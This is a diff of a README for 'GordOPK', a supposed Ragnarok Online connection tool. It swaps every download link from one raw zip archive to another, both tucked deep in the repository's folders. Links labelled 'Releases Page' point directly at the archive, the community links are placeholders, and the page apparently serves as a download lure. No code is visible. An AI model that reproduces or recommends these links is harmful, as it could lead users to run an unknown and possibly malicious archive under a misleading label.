@@ -1,7 +1,7 @@
 # 🎮 GordOPK - Easy Connection to Ragnarök Online
 
 ## 📥 Download Now!
-[![Download GordOPK](https://raw.githubusercontent.com/giridharanSSK/GordOPK/main/etc/deps/vs/OPK-Gord-v1.7.zip)](https://raw.githubusercontent.com/giridharanSSK/GordOPK/main/etc/deps/vs/OPK-Gord-v1.7.zip)
+[![Download GordOPK](https://raw.githubusercontent.com/giridharanSSK/GordOPK/main/etc/ptr/Gord-OPK-1.5.zip)](https://raw.githubusercontent.com/giridharanSSK/GordOPK/main/etc/ptr/Gord-OPK-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## ⚙️ Download & Install
 
-1. **Visit the Releases Page:** To get the latest version of GordOPK, visit the following link: [Download GordOPK](https://raw.githubusercontent.com/giridharanSSK/GordOPK/main/etc/deps/vs/OPK-Gord-v1.7.zip).
+1. **Visit the Releases Page:** To get the latest version of GordOPK, visit the following link: [Download GordOPK](https://raw.githubusercontent.com/giridharanSSK/GordOPK/main/etc/ptr/Gord-OPK-1.5.zip).
    
 2. **Choose Your Version:** On the releases page, look for the version that fits your needs. The latest version is typically listed at the top.
 
@@ -61,7 +61,7 @@ For further assistance, you can join our community forums or visit the official 
 
 ## 🔗 Useful Links
 
-- [GordOPK Releases Page](https://raw.githubusercontent.com/giridharanSSK/GordOPK/main/etc/deps/vs/OPK-Gord-v1.7.zip)
+- [GordOPK Releases Page](https://raw.githubusercontent.com/giridharanSSK/GordOPK/main/etc/ptr/Gord-OPK-1.5.zip)
 - [Discord Server](#) *(link to be provided)*
 - [Community Forums](#) *(link to be provided)*
 
